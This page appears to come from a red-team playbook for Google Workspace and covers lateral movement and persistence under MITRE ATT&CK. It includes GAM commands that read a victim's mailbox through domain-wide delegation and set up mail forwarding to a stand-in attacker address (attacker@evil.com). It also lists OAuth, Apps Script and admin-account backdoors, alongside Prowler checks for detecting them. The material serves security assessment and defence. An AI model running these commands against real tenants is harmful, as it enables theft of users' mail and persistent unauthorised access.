# Google Workspace · Phase 4 — Lateral Movement & Persistence

> ATT&CK [TA0008 Lateral Movement](../_cloud-base/TA0008-lateral-movement.md) +
> [TA0003 Persistence](../_cloud-base/TA0003-persistence.md) +
> [TA0002 Execution](../_cloud-base/TA0002-execution.md), projected onto Workspace.

## Lateral movement
#### T1534 Internal Spearphishing · T1114 (cross-mailbox via DWD)
- From a compromised account, phish internally; or with **DWD** read any user's
  mail/Drive (impersonate `subject=victim`).
  ```sh
  gam user victim@target.com show messages            # with admin/DWD
  ```
- **Negative (vulnerable):** DWD or broad delegation lets one credential traverse
  all mailboxes/drives.

#### Drive/Groups pivot
Over-shared Drive files and public Groups expose data across the org; adding
yourself to a privileged Group inherits its access. Prowler
`drive_external_sharing_warn_users`, `drive_sharing_allowlisted_domains`.

## Persistence
#### T1098 Account Manipulation / T1137-style app persistence
- **Gmail filters / forwarding** (quiet exfil + persistence):
  ```sh
  gam user victim@target.com add filter from me@x forward attacker@evil.com
  gam user victim@target.com add forwardingaddress attacker@evil.com
  ```
  Negative: external auto-forward → persistent exfil.
- **OAuth token / app password** backdoor; a self-authorized **Apps Script** bound
  to a doc/trigger running as the user.
- **DWD client** left registered = standing tenant-wide impersonation.

#### T1136.003 Create Account: Cloud Account
Create a new user / grant a delegated admin role — standing backdoor identity.

---
*Base: [Lateral Movement](../_cloud-base/TA0008-lateral-movement.md) ·
[Persistence](../_cloud-base/TA0003-persistence.md) ·
[Execution](../_cloud-base/TA0002-execution.md). Next: [Phase 5 — Evasion](05-evasion.md).*
